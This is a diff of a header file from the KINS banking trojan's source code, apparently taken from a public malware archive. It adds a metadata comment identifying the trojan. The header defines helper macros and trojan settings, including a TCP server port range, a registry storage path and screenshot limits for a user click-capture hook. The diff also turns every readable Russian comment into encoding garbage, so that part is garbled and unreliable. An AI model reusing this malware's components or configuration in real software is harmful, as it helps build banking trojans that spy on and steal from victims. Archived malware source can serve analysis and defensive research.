@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #pragma once
 
 #if defined _WIN64
@@ -8,14 +19,14 @@
 #define getImageBase(module) ((PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew))->OptionalHeader.ImageBase
 #endif
 
-//Формирование и и контроль версий.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 #define MAKE_VERSION(a, b, c, d) (((((DWORD)(a)) & 0xFF) << 24) | ((((DWORD)(b)) & 0xFF) << 16) | ((((DWORD)(c)) & 0xFF) << 8) | ((((DWORD)(d)) & 0xFF)))
 #define VERSION_MAJOR(a)         ((BYTE)(((a) >> 24) & 0xFF))
 #define VERSION_MINOR(b)         ((BYTE)(((b) >> 16) & 0xFF))
 #define VERSION_SUBMINOR(c)      ((BYTE)(((c) >> 8) & 0xFF))
 #define VERSION_BUILD(d)         ((BYTE)((d) & 0xFF))
 
-//Префиксы для функции, которые целиком написаны на asm.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ asm.
 #if defined _WIN64
 #  define ASM_INTERNAL_DEF
 #  define ASM_INTERNAL
@@ -28,41 +39,41 @@
 #define ROL(x,n) (((x) << (n)) | ((x) >> (32-(n))))
 #define BSWAP(x) (((x) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | ((x) << 24)) 
 
-//Конвертация BIG_ENDIAN <=> LITTLE_ENDIAN 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BIG_ENDIAN <=> LITTLE_ENDIAN 
 #define SWAP_WORD(s) (((((WORD)(s)) >> 8) & 0x00FF) | ((((WORD)(s)) << 8) & 0xFF00))
 #define SWAP_DWORD(l) (((((DWORD)(l)) >> 24) & 0x000000FFL) | ((((DWORD)(l)) >>  8) & 0x0000FF00L) | ((((DWORD)(l)) <<  8) & 0x00FF0000L) | ((((DWORD)(l)) << 24) & 0xFF000000L))
 
-//Создание qword из двух dword
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ qword пїЅпїЅ пїЅпїЅпїЅпїЅ dword
 #define MAKEDWORD64(l, h) ((DWORD64)(((DWORD)((DWORD64)(l) & MAXDWORD)) | ((DWORD64)((DWORD)((DWORD64)(h) & MAXDWORD))) << 32))
 
-//Количетсво попыток подключения.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 #define WININET_CONNECT_RETRY_COUNT 5
 
-//Задержка между подключениями.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 #define WININET_CONNECT_RETRY_DELAY 5000
 
-//Место хранения настроек в реесте.
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 #define PATH_REGKEY L"SOFTWARE\\Microsoft"
 
-//Расширение для PE executable.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ PE executable.
 #define FILEEXTENSION_EXECUTABLE L".exe"
 
-//Расширение для временного файла.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 #define FILEEXTENSION_TEMP L".tmp"
 
-//Расширение для текстового файла.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 #define FILEEXTENSION_TXT L".txt"
 
-//Страница для теста лага.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 #define TESTLATENCY_URL "http://www.google.com/webhp"
 
-//Переуд портов для TCP-сервера.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ TCP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 #define TCPSERVER_PORT_FIRST 10000
 #define TCPSERVER_PORT_LAST  40000
 
-//Шрифт используемый в диалогах
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #define FONT_DIALOG "MS Shell Dlg 2"
 
-//Формат скриншота для UserHook.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ UserHook.
 #define USERCLICK2IMAGE_LIMIT  40
 #define USERCLICK2IMAGE_SIZE   500
